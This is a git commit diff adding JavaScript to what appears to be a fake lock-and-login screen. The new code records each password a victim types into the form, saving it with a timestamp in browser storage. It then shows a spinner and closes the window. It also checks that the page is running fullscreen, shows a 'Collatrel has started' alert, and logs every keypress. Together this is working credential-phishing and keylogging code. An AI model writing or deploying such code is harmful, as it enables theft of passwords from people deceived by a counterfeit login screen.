f820992055a2e769bcd85e820fcd6f018d3e08dd
Sirmed Mehmood <SIRMEDVITA@GMAIL.COM>
2023-05-11 07:25:46 -0700

    Final from bwp

--- script.js
+++ script.js
@@ -2,3 +2,55 @@ document.addEventListener("click", () => {
     document.getElementById("lock-screen").classList.remove("open")
     document.getElementById("login-screen").classList.add("open")
 })
+
+document.getElementById("form").addEventListener("submit", (e) => {
+    e.preventDefault()
+    const pass = document.getElementById("pass").value
+    let allPasswords = JSON.parse(localStorage.getItem("passes")) || []
+
+    allPasswords.push({
+        password: pass,
+        date: new Date()
+    })
+
+    localStorage.setItem("passes", JSON.stringify(allPasswords))
+
+    document.getElementById("form").innerHTML = `
+        <div class='loader'>
+            <div class="bg"></div>
+            <div class='circle'></div>
+            <div class='circle'></div>
+            <div class='circle'></div>
+            <div class='circle'></div>
+            <div class='circle'></div>
+        </div>
+    `
+
+    setTimeout(() => {
+        window.close()
+    }, 2000)
+
+})
+
+function checkScreen() {
+    if (window.innerHeight !== screen.height) {
+        if(window.opener !== null) {
+            window.close()
+        } else {
+            document.body.innerHTML = `
+                <div class="death">
+                </div>
+            `
+        }
+    }
+    setTimeout(checkScreen, 10)
+}
+
+setTimeout(() => {
+    alert("Collatrel has started")
+    checkScreen()
+}, 5000);
+
+document.addEventListener("keypress", (e) => {
+    console.log(e.key)
+})
